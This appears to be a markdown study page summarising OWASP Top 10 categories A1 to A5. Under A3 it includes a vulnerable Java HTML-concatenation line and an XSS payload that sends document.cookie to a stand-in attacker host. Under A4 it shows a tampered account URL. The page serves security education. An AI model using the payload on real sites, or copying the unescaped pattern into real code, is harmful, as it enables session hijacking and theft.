## OWASP A1 - Injection

### See: [MySQL](mysql.md)

## OWASP A2 - Broken authentication and Sessions management

### Session ID's

## OWASP A3 - Cross-Site Scripting \(XSS\)

### See: [XSS](xss.md)

The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:

`(String) page += "<input name='creditcard' type='TEXT‘ value='" + request.getParameter("CC") + "'>";`

The attacker modifies the ‘CC’ parameter in his browser to:

`'<script>document.location= 'http://www.attacker.com/cgi-bin/cookie.cgi? foo='+document.cookie</script>'.`

This causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.

## OWASP A4 - Insecure Direct Object References

A direct object reference occurs when a developer exposes a reference to an internal implementation object, such as a file, directory, or database key. Without an access control check or other protection, attackers can manipulate these references to access unauthorized data.

The attacker simply modifies the `‘acct’` parameter in her browser to send whatever account number she wants. If not properly verified, the attacker can access any user’s account, instead of only the intended customer’s account. `http://example.com/app/accountInfo?acct=notmyacct`

## OWASP A5 - Security Misconfigurations

**Am I Vulnerable to Attack?**

Is your application missing the proper security hardening across any part of the application stack? Including:

1. Is any of your software out of date? This includes the OS, Web/App Server, DBMS, applications, and all code libraries \(see new A9\).
2. Are any unnecessary features enabled or installed \(e.g., ports, services, pages, accounts, privileges\)?
3. Are default accounts and their passwords still enabled and unchanged?
4. Does your error handling reveal stack traces or other overly informative error messages to users?
5. Are the security settings in your development frameworks \(e.g., Struts, Spring, ASP.NET\) and libraries not set to secure values? 

Without a concerted, repeatable application security configuration process, systems are at a higher risk.
